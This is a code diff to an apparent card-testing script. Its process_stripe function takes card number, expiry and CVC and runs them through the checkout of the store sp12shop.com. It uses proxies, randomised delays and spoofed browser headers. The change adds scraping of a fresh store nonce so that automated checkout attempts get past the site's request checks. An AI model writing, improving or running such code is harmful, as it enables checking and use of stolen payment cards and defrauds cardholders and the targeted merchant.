@@ -141,8 +141,16 @@ async def process_stripe(cc, mm, yy, cvc, proxy_url=None):
             if not non_match:
                 return False, "Failed to get cart nonce (site might be down or blocked)", "", None, "Unknown"
             non = non_match.group(1)
+
+            store_nonce = None
+            try:
+                async with s.get('https://sp12shop.com/wp-json/wc/store/v1/cart', headers={'user-agent': headers_cart['user-agent']}, proxy=proxy_url) as r_st_cart:
+                    store_nonce = r_st_cart.headers.get('Nonce') or r_st_cart.headers.get('X-WP-Nonce')
+            except Exception:
+                pass
             
             await human_delay()
+
             
             # 3. Simulate Cart
             headers_sim = {
@@ -278,18 +286,20 @@ async def process_stripe(cc, mm, yy, cvc, proxy_url=None):
             await human_delay()
             
             # 7. Final Checkout
+            active_nonce = store_nonce or checkout_nonce or '126b20a63c'
             headers_checkout = {
                 'host': 'sp12shop.com',
-                'nonce': '126b20a63c', # Hardcoded in original, though likely tied to session
+                'nonce': active_nonce,
                 'pragma': 'no-cache',
                 'cache-control': 'no-cache',
-                'x-wp-nonce': checkout_nonce,
+                'x-wp-nonce': active_nonce,
                 'user-agent': headers_cart['user-agent'],
                 'accept': 'application/json, */*;q=0.1',
                 'content-type': 'application/json',
                 'origin': 'https://sp12shop.com',
                 'referer': 'https://sp12shop.com/checkout/',
             }
+
             
             session_pages = str(random.randint(5, 20))
             session_count = str(random.randint(1, 3))
